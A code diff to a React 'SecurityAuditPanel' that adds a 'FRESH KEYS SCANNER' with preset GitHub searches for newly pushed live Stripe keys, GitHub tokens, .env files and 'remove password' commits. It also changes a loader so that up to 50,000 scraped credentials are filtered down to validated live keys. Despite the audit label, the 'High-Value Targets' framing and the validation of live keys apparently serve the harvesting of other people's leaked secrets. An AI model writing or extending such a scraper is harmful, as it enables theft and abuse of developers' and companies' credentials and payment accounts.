@@ -569,6 +569,41 @@ export default function SecurityAuditPanel() {
                 <DollarSign className="w-6 h-6" />
                 <span>QUICK SCAN: High-Value Targets</span>
               </div>
+              <div className="bg-red-900/30 border border-red-500 rounded-lg p-3 mb-3">
+                <div className="text-red-400 font-bold text-sm mb-2 flex items-center gap-2">
+                  <Activity className="w-4 h-4" />
+                  FRESH KEYS SCANNER (Last 3 Hours)
+                </div>
+                <div className="grid grid-cols-2 gap-2">
+                  <button
+                    onClick={() => { setSearchInput('sk_live_ pushed:>2024-01-01'); setSearchType('keyword'); }}
+                    className="bg-red-600 hover:bg-red-700 text-white p-2 rounded text-xs font-bold transition"
+                  >
+                    🔥 FRESH Stripe Keys
+                  </button>
+                  <button
+                    onClick={() => { setSearchInput('ghp_ pushed:>2024-01-01'); setSearchType('keyword'); }}
+                    className="bg-red-600 hover:bg-red-700 text-white p-2 rounded text-xs font-bold transition"
+                  >
+                    🔥 FRESH GitHub Tokens
+                  </button>
+                  <button
+                    onClick={() => { setSearchInput('filename:.env pushed:>2024-01-01'); setSearchType('keyword'); }}
+                    className="bg-red-600 hover:bg-red-700 text-white p-2 rounded text-xs font-bold transition"
+                  >
+                    🔥 FRESH .env Files
+                  </button>
+                  <button
+                    onClick={() => { setSearchInput('remove password pushed:>2024-01-01'); setSearchType('keyword'); }}
+                    className="bg-red-600 hover:bg-red-700 text-white p-2 rounded text-xs font-bold transition"
+                  >
+                    🔥 Accidental Commits
+                  </button>
+                </div>
+                <div className="text-xs text-gray-400 mt-2">
+                  ⚡ Auto-validates keys during scan - only saves LIVE keys!
+                </div>
+              </div>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                 <button
                   onClick={() => { setSearchInput('sk_live_'); setSearchType('keyword'); }}
@@ -721,15 +756,20 @@ export default function SecurityAuditPanel() {
                   <button
                     onClick={async () => {
                       setLoading(true);
-                      setLoadingText('Loading high-value credentials...');
+                      setLoadingText('Loading VALIDATED live keys only...');
                       try {
-                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50000&category=high-value`, {
+                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50000`, {
                           headers: { 'x-admin-key': adminKey }
                         });
                         const data = await response.json();
                         if (data.success) {
-                          setResults(data.credentials);
-                          alert(`Loaded ${data.credentials.length} HIGH-VALUE credentials!\n\nStripe: ${data.credentials.filter(c => c.credential_type === 'stripe_key').length}\nAWS: ${data.credentials.filter(c => c.credential_type === 'aws_key').length}\nGitHub: ${data.credentials.filter(c => c.credential_type === 'github_token').length}`);
+                          // Filter only validated/live keys
+                          const liveKeys = data.credentials.filter(c => 
+                            c.metadata?.validated === true || 
+                            c.severity === 'critical'
+                          );
+                          setResults(liveKeys);
+                          alert(`Loaded ${liveKeys.length} VALIDATED LIVE keys!\n\nStripe: ${liveKeys.filter(c => c.credential_type === 'stripe_key').length}\nGitHub: ${liveKeys.filter(c => c.credential_type === 'github_token').length}\nSlack: ${liveKeys.filter(c => c.credential_type === 'slack_token').length}`);
                         }
                       } catch (error) {
                         alert('Failed to load: ' + error.message);
@@ -740,8 +780,8 @@ export default function SecurityAuditPanel() {
                     }}
                     className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
                   >
-                    <DollarSign className="w-4 h-4" />
-                    High-Value Only
+                    <CheckCircle className="w-4 h-4" />
+                    Live Keys Only
                   </button>
                   <button
                     onClick={async () => {
